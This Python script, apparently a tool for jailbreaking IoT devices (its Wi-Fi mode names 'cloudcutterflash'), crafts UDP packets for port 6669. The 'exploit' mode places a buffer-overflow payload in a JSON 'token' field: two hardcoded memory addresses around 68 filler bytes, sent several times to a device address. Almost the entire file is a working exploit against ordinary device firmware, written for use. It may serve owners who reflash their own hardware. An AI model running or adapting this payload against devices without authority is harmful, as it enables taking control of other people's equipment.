#!/usr/bin/env python3
import argparse
import json
import random
import socket
import string
import struct
import time
import zlib


def packet(payload: bytes) -> bytes:
    head, tail = 0x55AA, 0xAA55
    body = struct.pack("!IIII", head, 0, 1, len(payload) + 8) + payload
    return body + struct.pack("!II", zlib.crc32(body), tail)


def exploit_packet(config_path: str = None) -> bytes:
    random.seed()
    if config_path:
        with open(config_path, "r", encoding="utf-8") as fs:
            config = json.load(fs)
        auth_key = config["auth_key"]
        uuid = config["uuid"]
    else:
        auth_key = "".join(random.choices(string.ascii_letters + string.digits, k=16))
        uuid = "".join(random.choices(string.ascii_letters + string.digits, k=12))
    address_token = (0x9B048CCD).to_bytes(4, "little")
    address_finish = (0x9B079001).to_bytes(4, "little")
    token = address_token + (b"A" * 68) + address_finish

    values = {
        "auzkey": auth_key,
        "uuid": uuid,
        "pskKey": "",
        "prod_test": False,
        "ap_ssid": "A",
        "ssid": "A",
        "token": token,
    }
    encoded = []
    for key, value in values.items():
        if isinstance(value, bytes):
            val = b'"' + value + b'"'
        elif value is True:
            val = b"true"
        elif value is False:
            val = b"false"
        else:
            val = b'"' + value.encode() + b'"'
        encoded.append(f'"{key}":'.encode() + val)
    return packet(b"{" + b",".join(encoded) + b"}")


def wifi_packet() -> bytes:
    payload = json.dumps({
        "ssid": "cloudcutterflash",
        "token": "AAAAAAAA",
        "passwd": "abcdabcd",
    }, separators=(",", ":")).encode("ascii")
    return packet(payload)


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("mode", choices=("exploit", "wifi"))
    parser.add_argument("--ip", default="192.168.175.1")
    parser.add_argument("--port", type=int, default=6669)
    parser.add_argument("--config")
    args = parser.parse_args()

    datagram = exploit_packet(args.config) if args.mode == "exploit" else wifi_packet()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    count, delay = (5, 0.2) if args.mode == "exploit" else (4, 0.05)
    for _ in range(count):
        sock.sendto(datagram, (args.ip, args.port))
        time.sleep(delay)
    sock.close()


if __name__ == "__main__":
    main()
